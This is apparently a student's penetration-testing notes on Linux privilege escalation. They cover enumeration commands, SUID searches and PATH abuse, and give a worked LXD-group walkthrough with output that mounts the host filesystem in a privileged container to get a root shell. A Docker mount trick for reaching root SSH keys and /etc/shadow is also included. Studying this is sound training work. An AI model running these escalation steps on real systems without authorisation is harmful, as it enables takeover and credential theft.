---
{"dg-publish":true,"permalink":"/cybersecurity/penetration-tester/linux-privilege-escalation/"}
---


# Introduction

## Enumeration

We can use scripts: (such as [LinEnum](https://github.com/rebootuser/LinEnum))

- OS Version
- Kernel VErsion
- Running Services

### List Current Processes

`ps aux | grep root`

### List Current Processes

```shell-session
$ ps au

USER       		PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      		1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --
cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash
shared     		1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash
root      		1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su
root      		1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su
root      		1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash
shared     		1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au
```

### Starting Points

- `ls /home`
- `ls -la /home/<user>`
- `ls -l ~/.ssh`
- `history`
- `sudo -l`
- `cat /etc/passwd`
- `ls -la /etc/cron.daily`
- `lsblk` (for unmounted drives)
- `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` (Find writable directories.)
- `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` (Find writable files.)

# Local Privilege Escalation Techniques

- `uname -a`
- `cat /etc/lsb-release`

Then look for POC's exploits, etc.

## Vulnerable Services

### Special Permissions

Find files with suid bit:
```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Find setgid set.
```
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

### Sudo Rights Abuse

Check `sudo -l`

### Path Abuse

If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

# Wildcard Abuse

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Character</strong></th>
<th><strong>Significance</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>An asterisk that can match any number of characters in a file name.</td>
</tr>
<tr>
<td><code>?</code></td>
<td>Matches a single character.</td>
</tr>
<tr>
<td><code>[ ]</code></td>
<td>Brackets enclose characters and can match any single one at the defined position.</td>
</tr>
<tr>
<td><code>~</code></td>
<td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td>
</tr>
<tr>
<td><code>-</code></td>
<td>A hyphen within brackets will denote a range of characters.</td>
</tr>
</tbody>
</table>

## Shared Libraries

## Shared Object Hijacking

## Group Memberships

## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```


## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

# Linux hardening
